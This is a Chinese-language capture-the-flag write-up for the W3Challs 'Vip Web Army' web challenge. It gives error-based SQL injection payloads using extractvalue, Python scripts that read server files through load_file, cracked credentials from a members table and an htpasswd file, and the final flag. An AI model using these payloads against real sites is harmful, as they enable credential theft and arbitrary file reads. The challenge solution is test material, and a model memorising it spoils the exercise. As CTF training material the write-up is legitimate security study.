# Vip Web Army

### SQL Injection
* 這一題基本上就是 sql injection，注入點在 recipient 這裡
* 用 postman 稍微送一下可以發現回傳會有錯誤資訊
    ```sql=
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\', '123')' at line 1
    ```
    payload = `'`
* 所以這一題基本上可以用 error base 的方式爆出資料
* `@@` 的[意思](https://stackoverflow.com/questions/15961463/mysql-what-does-mean)
* payload list
    ```sql=
    -- 版本
    -- XPATH syntax error: '~10.3.18-MariaDB~'
    extractvalue(1,concat(0x7e,(select @@version),0x7e))
    
    -- 資料庫名
    -- XPATH syntax error: '~VipWebArmy~'
    extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1),0x7e))
    
    -- 爆表名
    -- XPATH syntax error: '~members~'
    -- 因為引號會被 addslashes，所以用 hex 逃逸
    extractvalue(1,concat(0x7e,(select table_name from information_schema.columns where table_schema=0x56697057656241726d79 limit 0,1),0x7e))
    
    -- 爆 columns
    -- XPATH syntax error: '~id~'
    extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=0x56697057656241726d79 limit 0,1),0x7e))
    -- XPATH syntax error: '~login~'
    extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=0x56697057656241726d79 limit 1,1),0x7e))
    -- XPATH syntax error: '~password~'
    extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=0x56697057656241726d79 limit 2,1),0x7e))
    
    -- 爆出內容
    -- XPATH syntax error: '~LuG[3]R~'
    extractvalue(1,concat(0x7e,(select login from members limit 0,1),0x7e))
    -- XPATH syntax error: '~4188679c1d8a284ccc41a6b601869e0'
    extractvalue(1,concat(0x7e,(select password from members limit 0,1),0x7e))
    ```
* 可以看到 password 明顯被雜湊過，直接用 online 的 md5 decryption 來解解看，解出來的結果 `kiss`
* 直接登入 http://vip.hax.w3challs.com/index.php?page=login `LuG[3]R:kiss`
* 可以得知一個 file 是需要帳密才可以訪問的
* 想法上是用 `load_file` 拿到檔案，但是 path 不是預設的 path
* 用 `secure_file_priv` 可以爆出 path
    ```sql=
    -- XPATH syntax error: '~/home/vipwebarmy/www/~'
    extractvalue(1,concat(0x7e,(select @@secure_file_priv),0x7e))
    ```
* 之後就可以用 `/home/vipwebarmy/www/VipWebArmy.php` 來 load file
    ```sql=
    -- XPATH syntax error: '~<?php

    -- /*********************'
    extractvalue(1,concat(0x7e,(load_file(0x2f686f6d652f76697077656261726d792f7777772f56697057656241726d792e706870)),0x7e))
    ```
    * python script
        ```python=
        import requests

        url = 'http://vip.hax.w3challs.com/index.php?page=contact'
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36'
        }
        # i = 1
        for i in range(30):
            payload = 'extractvalue(1,concat(0x7e,(substr(load_file(0x2f686f6d652f76697077656261726d792f7777772f56697057656241726d792e706870),{},30)),0x7e))'.format(str(1 + i * 30))
            data = {
                'recipient': payload, 
                'msg': '123'
            }
            cookies = {
                'PHPSESSID': 'your_PHPSESSID'
            }
            response = requests.post(url, headers=headers, data=data, cookies=cookies)
            # print(response.text)
            print(response.text[763:793], end='')
            if '?>' in response.text[763:793]:
                break
        ```
    * VipWebArmy.php source code
        ```php=
        <?php

        /********************************************************************************************\
        |            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                    |
        | A comment that seems useless but that is useful nonetheless. Understand if you can :D      |
        | Do not remove!                                                                             |
        |            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                    |
        \*******************************************************************************************/

        session_start();

        require_once('lang.php');
        require_once('../db/vip.php');

        if(!isset($_SESSION['admin']) || $_SESSION['admin']!==True)
                echo fail_auth1;
        else
                echo password_is.password('azerfazefazdamlfkazoezaefralmzefalz').'.';

        ?>
        ```
        * 顯然沒什麼用處
* 這時候要思考一個點是在 apache 裡面，定義 file security 的地方在哪裡 `.htaccess` `/home/vipwebarmy/www/.htaccess`
    * python script
        ```python=
        import requests

        url = 'http://vip.hax.w3challs.com/index.php?page=contact'
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36'
        }
        # i = 1
        for i in range(30):
            payload = 'extractvalue(1,concat(0x7e,(substr(load_file(0x2f686f6d652f76697077656261726d792f7777772f2e6874616363657373),{},30)),0x7e))'.format(str(1 + i * 30))
            data = {
                'recipient': payload, 
                'msg': '123'
            }
            cookies = {
                'PHPSESSID': 'your_PHPSESSID'
            }
            response = requests.post(url, headers=headers, data=data, cookies=cookies)
            # print(response.text)
            print(response.text[763:793], end='')
            if '?>' in response.text[763:793]:
                break
        ```
    * .htaccess
        ```file=
        <Files VipWebArmy.php>
        AuthType Basic
        AuthName "VipWebArmy - Protected Area"
        AuthUserFile "/home/vipwebarmy/www/pass/pass.txt"
        require valid-user
        </Files>
        ```
* 可以得知關鍵路徑 `/home/vipwebarmy/www/pass/pass.txt`
    * python script
        ```python=
        import requests

        url = 'http://vip.hax.w3challs.com/index.php?page=contact'
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36'
        }
        # i = 1
        for i in range(30):
            payload = 'extractvalue(1,concat(0x7e,(substr(load_file(0x2f686f6d652f76697077656261726d792f7777772f706173732f706173732e747874),{},30)),0x7e))'.format(str(1 + i * 30))
            data = {
                'recipient': payload, 
                'msg': '123'
            }
            cookies = {
                'PHPSESSID': 'your_PHPSESSID'
            }
            response = requests.post(url, headers=headers, data=data, cookies=cookies)
            # print(response.text)
            print(response.text[763:793], end='')
            if '?>' in response.text[763:793]:
                break
        ```
    * pass.txt
        ```=
        army:xedh6CDiqPkbA
        ```
    * 用 john 爆破一下 `army:soldier`
* 訪問 http://vip.hax.w3challs.com/VipWebArmy.php `army:soldier` 拿到 flag
* flag : `W3C{MenuM4xiB3st0f}`

### 題外話
* 這一題可以用 sqlmap 解
